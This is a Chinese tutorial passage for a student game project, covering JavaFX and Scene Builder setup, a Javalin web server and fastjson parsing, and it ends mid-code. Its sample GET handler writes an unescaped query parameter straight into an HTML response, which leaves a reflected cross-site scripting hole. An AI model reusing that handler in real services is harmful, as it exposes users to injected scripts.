<h3 id="Swing-可视化开发"><a href="#Swing-可视化开发" class="headerlink" title="Swing 可视化开发"></a>Swing 可视化开发</h3><p>开发图形化界面，离不开可视化的开发界面。<br>关于Swing的GUI设计器的食用方法，可以看看官方文档<a href="https://www.jetbrains.com/help/idea/gui-designer-basics.html">https://www.jetbrains.com/help/idea/gui-designer-basics.html</a>。</p>
<h2 id="JavaFX"><a href="#JavaFX" class="headerlink" title="JavaFX"></a>JavaFX</h2><p>先来个简单的介绍</p>
<blockquote>
<p>ChatGPT ： JavaFX是Java平台上的一套现代化的GUI（图形用户界面）工具包，用于构建丰富、交互式的桌面和移动应用程序的用户界面。下面是一些关键的概念和组件，帮助你了解JavaFX：</p>
<ul>
<li>Stage和Scene：在JavaFX中，应用程序的顶级容器是Stage，它代表了一个窗口。每个Stage包含一个或多个Scene，Scene定义了窗口中的内容和布局。</li>
<li>Node：Node是JavaFX中的基本构建块，它代表了界面上的一个可视元素。JavaFX提供了许多内置的Node子类，如Button、Label、TextField等，你还可以创建自定义的Node。</li>
<li>Layout：JavaFX提供了多种布局管理器，如VBox、HBox、BorderPane等，用于控制Node的位置和大小。布局管理器可以帮助你自动调整和排列节点，以适应不同的窗口大小和屏幕分辨率。</li>
<li>CSS样式：JavaFX支持使用CSS（层叠样式表）来为界面元素设置样式。你可以使用CSS来定义节点的外观、背景、字体等属性，以及定义动画和过渡效果。</li>
<li>事件处理：JavaFX使用事件模型来处理用户的交互操作，例如点击按钮、拖动滑块等。你可以为节点注册事件处理器，并在事件发生时执行相应的操作。</li>
<li>动画和效果：JavaFX提供了丰富的动画和效果支持，可以实现平滑的过渡、缩放、旋转等效果，以及渐变、阴影、模糊等视觉效果。</li>
<li>多媒体和图形：JavaFX内置了对多媒体和图形的支持，你可以播放音频和视频文件，加载和显示图像，创建图形和图表等。</li>
<li>JavaFX还提供了其他一些功能，如WebView（用于显示Web内容）、打印支持、国际化等。JavaFX的设计目标是提供一个现代化、易用且高性能的GUI开发框架，它在Java平台上得到了广泛的应用和支持。</li>
<li>你可以通过阅读JavaFX的官方文档、教程和示例来深入学习和实践JavaFX。开始使用JavaFX时，建议从简单的示例开始，逐步探索和构建更复杂的界面。祝你在学习JavaFX的过程中取得成功！</li>
</ul>
</blockquote>
<h3 id="Scene-Builder"><a href="#Scene-Builder" class="headerlink" title="Scene Builder"></a>Scene Builder</h3><p>JavaFX Scene Builder是一个可视化布局工具，用于设计和构建JavaFX应用程序的用户界面。它提供了拖放和配置组件的界面，简化了界面布局的过程。你可以选择组件、调整大小和位置，并设置CSS样式和事件处理。它与JavaFX紧密集成，可以与Java IDE配合使用。Scene Builder是一个强大而直观的工具，加速了JavaFX界面开发的过程。</p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><ol>
<li><p>Scene Builder 的安装网址: <a href="https://www.oracle.com/java/technologies/javafxscenebuilder-1x-archive-downloads.html">https://www.oracle.com/java/technologies/javafxscenebuilder-1x-archive-downloads.html</a></p>
</li>
<li><p>选择合适的版本下载</p>
</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/scenebuilder_1.png" class="" title="scenebuilder">

<ol start="3">
<li>可能需要登录Oracle账号，注册一个即可</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/scenebuilder_2.png" class="" title="scenebuilder">

<img src="/2023/12/29/CS109-Project-HappyMatch/scenebuilder_3.png" class="" title="scenebuilder">

<ol start="4">
<li>下载完后打开，根据引导完成安装</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/scenebuilder_4.png" class="" title="scenebuilder">

<img src="/2023/12/29/CS109-Project-HappyMatch/scenebuilder_5.png" class="" title="scenebuilder">

<img src="/2023/12/29/CS109-Project-HappyMatch/scenebuilder_6.png" class="" title="scenebuilder">

<ol start="5">
<li>接下来进行idea的配置：在新版本中，JavaFX插件已经内置，旧版本可<br>能需要手动下载。</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/scenebuilder_7.png" class="" title="scenebuilder">

<ol start="6">
<li>接下来进行软件的绑定，如图设置SceneBuilder的运行路径即可。</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/scenebuilder_8.png" class="" title="scenebuilder">

<h3 id="HelloWorld-第一个JavaFx程序"><a href="#HelloWorld-第一个JavaFx程序" class="headerlink" title="HelloWorld-第一个JavaFx程序"></a>HelloWorld-第一个JavaFx程序</h3><ol>
<li>创建JavaFX项目，如图选择</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/javaFx_1.png" class="" title="javaFx">

<img src="/2023/12/29/CS109-Project-HappyMatch/javaFx_2.png" class="" title="javaFx">

<ol start="2">
<li>初始程序</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/javaFx_3.png" class="" title="javaFx">

<ol start="3">
<li>右键 <code>hello-view.fxml</code> -&gt; 选择<code>在SceneBuilder 中打开</code></li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/javaFx_4.png" class="" title="javaFx">

<ol start="4">
<li>SceneBuilder 界面如图</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/javaFx_5.png" class="" title="javaFx">

<ol start="5">
<li>Controller中可以设置对应的控制类(示例代码已经给出对应的控制类)</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/javaFx_6.png" class="" title="javaFx">

<ol start="6">
<li>如何设置监听事件<br>如图，选择控件 &gt; 切换到code界面 &gt; 在想要监听的事件处写上方法名</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/javaFx_7.png" class="" title="javaFx">

<ol start="7">
<li>保存fxml文件，回到控制类，写上同名的控制方法。注意用<code>@FXML</code>标记。</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/javaFx_8.png" class="" title="javaFx">

<ol start="8">
<li>运行查看成果~</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/javaFx_9.png" class="" title="javaFx">

<h3 id="一些食用技巧"><a href="#一些食用技巧" class="headerlink" title="一些食用技巧"></a>一些食用技巧</h3><h4 id="Scene-Builder-预览界面"><a href="#Scene-Builder-预览界面" class="headerlink" title="Scene Builder 预览界面"></a>Scene Builder 预览界面</h4><img src="/2023/12/29/CS109-Project-HappyMatch/javaFx_10.png" class="" title="javaFx">

<h4 id="Scene-Builder-控制类代码示例"><a href="#Scene-Builder-控制类代码示例" class="headerlink" title="Scene Builder 控制类代码示例"></a>Scene Builder 控制类代码示例</h4><p>快速生成控制类的代码~</p>
<img src="/2023/12/29/CS109-Project-HappyMatch/javaFx_11.png" class="" title="javaFx">

<h4 id="Scene-Builder-使用CSS"><a href="#Scene-Builder-使用CSS" class="headerlink" title="Scene Builder 使用CSS"></a>Scene Builder 使用CSS</h4><img src="/2023/12/29/CS109-Project-HappyMatch/javaFx_12.png" class="" title="javaFx">

<p>具体规则可参考：<a href="https://docs.oracle.com/javase/8/javafx/api/javafx/scene/doc-files/cssref.html">https://docs.oracle.com/javase/8/javafx/api/javafx/scene/doc-files/cssref.html</a></p>
<h4 id="JavaFX-多界面切换"><a href="#JavaFX-多界面切换" class="headerlink" title="JavaFX 多界面切换"></a>JavaFX 多界面切换</h4><p>目录结构如下</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><code class="hljs xl">H<span class="hljs-function"><span class="hljs-title">elloController</span>.java -&gt;</span> 主界面控制类<br>O<span class="hljs-function"><span class="hljs-title">therPage</span>.java -&gt;</span> 界面<span class="hljs-number">2</span>控制类<br><br><span class="hljs-function"><span class="hljs-title">hello</span>-view.fxml -&gt;</span> 主界面<br>O<span class="hljs-function"><span class="hljs-title">therPage</span> -&gt;</span> 界面<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<img src="/2023/12/29/CS109-Project-HappyMatch/javaFx_13.png" class="" title="javaFx">

<ol>
<li>OtherPage.fxml 设置</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/javaFx_14.png" class="" title="javaFx">

<ol start="2">
<li>源码<br>HelloController.java<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@FXML</span><br>    <span class="hljs-keyword">private</span> Label welcomeText;<br><br>    <span class="hljs-meta">@FXML</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">btnClick</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Stage</span> <span class="hljs-variable">primaryStage</span> <span class="hljs-operator">=</span> (Stage) welcomeText.getScene().getWindow();<br>        <span class="hljs-comment">//加载fxml文件</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> getClass().getResource(<span class="hljs-string">&quot;OtherPage.fxml&quot;</span>);<br>        <span class="hljs-comment">//加载完fxml文件后，获取其中的root</span><br>        <span class="hljs-type">Parent</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> FXMLLoader.load(Objects.requireNonNull(url));<br>        <span class="hljs-comment">//设置场景</span><br>        <span class="hljs-type">Scene</span> <span class="hljs-variable">scene</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scene</span>(root);<br>        primaryStage.setScene(scene);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
OtherPage.java<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OtherPage</span> &#123;<br>    <span class="hljs-meta">@FXML</span><br>    Button btn;<br>    <span class="hljs-meta">@FXML</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">gotoMain</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Stage</span> <span class="hljs-variable">primaryStage</span> <span class="hljs-operator">=</span> (Stage) btn.getScene().getWindow();<br>        <span class="hljs-comment">//加载fxml文件</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> getClass().getResource(<span class="hljs-string">&quot;hello-view.fxml&quot;</span>);<br>        <span class="hljs-comment">//加载完fxml文件后，获取其中的root</span><br>        <span class="hljs-type">Parent</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> FXMLLoader.load(Objects.requireNonNull(url));<br>        <span class="hljs-comment">//设置场景</span><br>        <span class="hljs-type">Scene</span> <span class="hljs-variable">scene</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scene</span>(root);<br>        primaryStage.setScene(scene);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li>效果</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/javaFx_15.png" class="" title="javaFx">

<h4 id="JavaFX-播放音频"><a href="#JavaFX-播放音频" class="headerlink" title="JavaFX 播放音频"></a>JavaFX 播放音频</h4><p>下面是一个简单的音频播放类，其中包含一个静态方法用于播放音频。你可以将以下代码保存到一个名为AudioPlayer.java的文件中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javafx.scene.media.Media;<br><span class="hljs-keyword">import</span> javafx.scene.media.MediaPlayer;<br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AudioPlayer</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">playAudio</span><span class="hljs-params">(String audioFilePath)</span> &#123;<br>        <span class="hljs-type">Media</span> <span class="hljs-variable">media</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Media</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(audioFilePath).toURI().toString());<br>        <span class="hljs-type">MediaPlayer</span> <span class="hljs-variable">mediaPlayer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MediaPlayer</span>(media);<br>        mediaPlayer.play();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>你需要在 <code>pom.xml</code> 中配置依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.openjfx<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javafx-media<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>19.0.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>使用示例：<br></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//播放音频</span><br><span class="hljs-comment">//确保文件存在于resources对应的文件夹下</span><br><span class="hljs-keyword">try</span> &#123;<br>    AudioPlayer.playAudio(getClass().getResource(<span class="hljs-string">&quot;sample.mp3&quot;</span>).getPath());<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="JavaFX就介绍到这里，更多操作自行探索吧"><a href="#JavaFX就介绍到这里，更多操作自行探索吧" class="headerlink" title="JavaFX就介绍到这里，更多操作自行探索吧~"></a>JavaFX就介绍到这里，更多操作自行探索吧~</h4><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>根据不同的项目，可以按照需求选择要不要写服务端。</p>
<h3 id="服务端可以干什么"><a href="#服务端可以干什么" class="headerlink" title="服务端可以干什么"></a>服务端可以干什么</h3><blockquote>
<p>GPT: 游戏的服务器端通常承担着多个功能和责任。以下是游戏服务器端可能承担的一些常见任务和功能：</p>
<ol>
<li>游戏逻辑处理：服务器端负责处理游戏的逻辑和规则。它会验证和执行玩家的操作，并确保游戏状态的一致性和合法性。服务器端会处理游戏中的各种事件、计算分数、处理胜负条件等。</li>
<li>网络通信：服务器端负责处理与客户端之间的网络通信。它接收来自客户端的请求和指令，并将游戏状态和更新发送回客户端。服务器端还负责处理网络连接、数据传输和通信协议等相关任务。</li>
<li>用户管理：服务器端负责管理玩家的账户、角色和权限等信息。它可以处理用户注册、登录、验证和身份验证等操作。服务器端还可以管理玩家之间的好友关系、排行榜、成就系统等。</li>
<li>数据存储和持久化：服务器端负责将游戏数据存储在持久化存储介质中，如数据库或文件系统。它可以存储玩家的进度、成就、物品、排行榜数据等。服务器端还可以处理数据的读取、写入和查询等操作。</li>
<li>多人游戏支持：服务器端支持多人游戏模式，允许多个玩家同时参与游戏。它可以处理玩家之间的交互、同步游戏状态、处理多个并发操作等。</li>
<li>安全和防作弊：服务器端负责确保游戏的安全性和防止作弊行为。它可以验证客户端请求的合法性，检测和阻止作弊行为，并采取必要的安全措施来保护玩家的数据和隐私。</li>
<li>扩展和维护：服务器端需要具备可扩展性和易于维护的特性。它应该能够处理大量玩家的同时在线，支持游戏的更新和扩展，以及进行服务器的监控和维护。<br>这些只是游戏服务器端可能承担的一些常见任务和功能。具体的服务器端功能取决于游戏的类型、规模和需求。不同的游戏可能有不同的服务器端架构和功能设计。</li>
</ol>
</blockquote>
<h3 id="http-https服务器框架推荐"><a href="#http-https服务器框架推荐" class="headerlink" title="http&#x2F;https服务器框架推荐"></a>http&#x2F;https服务器框架推荐</h3><p>直接用就行，不会扣分<br><br>javalin : <a href="https://javalin.io/documentation#getting-started">https://javalin.io/documentation#getting-started</a> &lt;-有详细的官方教程，也可以参考我的后端项目 <a href="https://github.com/xCipHanD/happyMatchServer">https://github.com/xCipHanD/happyMatchServer</a></p>
<h3 id="简单的javalin程序"><a href="#简单的javalin程序" class="headerlink" title="简单的javalin程序"></a>简单的javalin程序</h3><ol>
<li>需要先配置 <code>pom.xml</code>，在里面加上这一段<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.javalin<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javalin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.6.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-simple<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.7<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.30<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure></li>
<li>创建主类 <code>Main.java</code><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> io.javalin.Javalin;<br><span class="hljs-keyword">import</span> io.javalin.http.staticfiles.Location;<br><span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> io.javalin.apibuilder.ApiBuilder.*;<br><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Javalin</span> <span class="hljs-variable">app</span> <span class="hljs-operator">=</span> Javalin.create(config -&gt; &#123;<br>            <span class="hljs-comment">//静态资源,可以放置一些文件、图片、音频、视频等静态文件。</span><br>            config.staticFiles.add(staticFiles -&gt; &#123;<br>                <span class="hljs-comment">//外部访问路径 如 http://ip:port/res/files/example.file</span><br>                staticFiles.hostedPath = <span class="hljs-string">&quot;/res/files&quot;</span>;<br>                <span class="hljs-comment">//内部文件存储路径(可自定义) 这里写的是运行目录下files文件夹</span><br>                <span class="hljs-comment">//如果文件夹不存在，则创建文件夹</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">directoryPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;/files&quot;</span>;<br>                <span class="hljs-type">File</span> <span class="hljs-variable">directory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(directoryPath);<br>                <span class="hljs-keyword">if</span> (!directory.exists() &amp;&amp; !directory.mkdirs()) &#123;<br>                    System.out.println(<span class="hljs-string">&quot;文件夹创建失败&quot;</span>);<br>                    System.exit(<span class="hljs-number">1</span>);<br>                &#125;<br>                staticFiles.directory = directoryPath;<br>            &#125;);<br>        &#125;).start(<span class="hljs-number">80</span>);<br><br>        <span class="hljs-comment">// 访问默认路径的输出，可以放个主页什么的</span><br>        app.get(<span class="hljs-string">&quot;/&quot;</span>, ctx -&gt; ctx.result(<span class="hljs-string">&quot;Hello World!&quot;</span>));<br><br>        <span class="hljs-comment">//路由不同路径，这里将 Controller中fromGet()路由到/api下，并且方法为GET；fromPost()路由到/api下，方法为POST。</span><br>        app.routes(() -&gt; &#123;<br>            path(<span class="hljs-string">&quot;/api&quot;</span>, () -&gt; get(Controller::fromGet));<br>            path(<span class="hljs-string">&quot;/api&quot;</span>, () -&gt; post(Controller::fromPost));<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li>控制类 <code>Controller.java</code><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> io.javalin.http.Context;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Controller</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fromGet</span><span class="hljs-params">(Context ctx)</span> &#123;<br>        ctx.contentType(<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>);<br>        String flag,result;<br>        <span class="hljs-keyword">try</span> &#123;<br>            flag = ctx.queryParam(<span class="hljs-string">&quot;flag&quot;</span>);<br>            <span class="hljs-keyword">if</span> (flag == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>();<span class="hljs-comment">//如果flag为空，则抛出异常</span><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (flag.equals(<span class="hljs-string">&quot;kfccrazythursdayvme50&quot;</span>)) &#123;<br>                result = <span class="hljs-string">&quot;No Way!&quot;</span>;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                result = <span class="hljs-string">&quot;Your flag is: &quot;</span> + flag;<br>            &#125;<br>            ctx.status(<span class="hljs-number">200</span>);<span class="hljs-comment">//设置正常的状态码</span><br>            ctx.result(result);<span class="hljs-comment">//设置返回内容</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            ctx.status(<span class="hljs-number">400</span>);<br>            ctx.result(<span class="hljs-string">&quot;参数不全&quot;</span>);<br>            <span class="hljs-comment">//如果无法解析参数，则报错</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li>运行查看效果</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/javalin_1.png" class="" title="javalin">

<ol start="5">
<li>用浏览器访问服务</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/javalin_2.png" class="" title="javalin">

<img src="/2023/12/29/CS109-Project-HappyMatch/javalin_3.png" class="" title="javalin">

<img src="/2023/12/29/CS109-Project-HappyMatch/javalin_4.png" class="" title="javalin">


<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><h4 id="序列化是什么"><a href="#序列化是什么" class="headerlink" title="序列化是什么"></a>序列化是什么</h4><blockquote>
<p>序列化是将对象转换为字节流或其他可存储或传输的格式的过程。在序列化过程中，对象的状态被转换为字节序列，以便可以在网络上传输或存储到磁盘上。反之，将字节流或其他序列化格式转换回对象的过程称为反序列化。<br>序列化的主要用途如下：</p>
<ol>
<li>数据持久化：通过序列化，可以将对象保存到磁盘上，以便在程序重新启动时恢复对象的状态。这对于需要长时间保存数据或在不同的系统之间传输数据非常有用。</li>
<li>数据传输：在网络通信中，可以使用序列化将对象转换为字节流，然后通过网络传输给其他系统。接收方可以通过反序列化将字节流转换回对象，从而获取原始数据。</li>
<li>分布式计算：在分布式系统中，不同的计算节点可能需要交换数据。通过序列化和反序列化，可以在节点之间传输对象，以便进行协作和共享数据。</li>
<li>缓存和消息队列：序列化还可以用于将对象存储在缓存中或发送到消息队列中。这样可以提高系统的性能和可扩展性。<br>总之，序列化是一种将对象转换为字节流或其他可存储或传输的格式的机制，它在数据持久化、数据传输、分布式计算以及缓存和消息队列等方面都有重要的应用。</li>
</ol>
</blockquote>
<h4 id="序列化有哪些"><a href="#序列化有哪些" class="headerlink" title="序列化有哪些"></a>序列化有哪些</h4><blockquote>
<p>常见的序列化方式有以下几种：</p>
<ol>
<li>JSON（JavaScript Object Notation）：JSON是一种轻量级的数据交换格式，它以文本形式表示结构化的数据。JSON序列化将对象转换为字符串，可以方便地在不同的系统之间传输和存储数据。主流编程语言都提供了JSON的序列化和反序列化库。</li>
<li>XML（eXtensible Markup Language）：XML是一种标记语言，用于描述和存储数据。XML序列化将对象转换为XML格式的字符串，可以用于数据交换和存储。与JSON相比，XML更为灵活，但也更为冗长。</li>
<li>Protocol Buffers：Protocol Buffers是Google开发的一种高效的二进制序列化格式。它使用描述文件定义数据结构，然后通过编译器生成相应的代码，用于序列化和反序列化。Protocol Buffers具有高效、紧凑和跨平台的特点，被广泛应用于分布式系统和通信协议中。</li>
<li>YAML（YAML Ain’t Markup Language）：YAML是一种人类可读的数据序列化格式，常用于配置文件和数据交换。YAML序列化将对象转换为YAML格式的字符串，具有易读性和可维护性。</li>
<li>BSON（Binary JSON）：BSON是一种二进制表示的JSON格式，用于在MongoDB数据库中存储和传输数据。BSON序列化将对象转换为二进制格式，具有高效性和可扩展性。<br>除了上述常见的序列化方式，不同的编程语言还可能提供自己的序列化机制，如Java中的Java Serialization、C#中的BinaryFormatter等。这些方式在特定语言和环境中具有一定的优势和适用性。</li>
</ol>
</blockquote>
<h4 id="为什么要在服务器和客户端的通信中使用序列化"><a href="#为什么要在服务器和客户端的通信中使用序列化" class="headerlink" title="为什么要在服务器和客户端的通信中使用序列化"></a>为什么要在服务器和客户端的通信中使用序列化</h4><p>主要是方便数据传输：</p>
<p>1.数据传输：服务器和客户端之间需要传输数据，而数据在网络传输中需要以字节流的形式进行传输。序列化可以将对象转换为字节流，使得数据可以在网络上传输。反序列化则可以将字节流转换回对象，以便在接收方进行处理和使用。</p>
<p>2.跨平台通信：服务器和客户端可能运行在不同的操作系统或编程语言中，它们的数据表示方式可能不同。通过使用一种通用的序列化格式，如JSON、XML或Protocol Buffers，可以将对象转换为中立的格式，使得不同平台之间可以相互理解和交换数据。</p>
<h4 id="如何食用-Json"><a href="#如何食用-Json" class="headerlink" title="如何食用 Json~"></a>如何食用 <code>Json</code>~</h4><ol>
<li>先在<code>pom.xml</code>中导入<code>fastjson</code>库<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.32<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li>
<li><code>Controller.java</code><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fromPost</span><span class="hljs-params">(Context ctx)</span> &#123;<br>    ctx.contentType(<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>);<br>    String flag;<br>    <span class="hljs-keyword">try</span> &#123;<br>        flag = ctx.formParam(<span class="hljs-string">&quot;flag&quot;</span>);<br>        <span class="hljs-keyword">if</span> (flag == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>();<span class="hljs-comment">//如果flag为空，则抛出异常</span><br>        &#125;<br>        <span class="hljs-comment">//使用fastjson解析flag</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSONObject.parseObject(flag);<br>        <span class="hljs-comment">//返回flag节点数</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Your flag has &quot;</span> + jsonObject.size() + <span class="hljs-string">&quot; nodes&quot;</span>;<br>        ctx.status(<span class="hljs-number">200</span>);<br>        ctx.result(result);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) 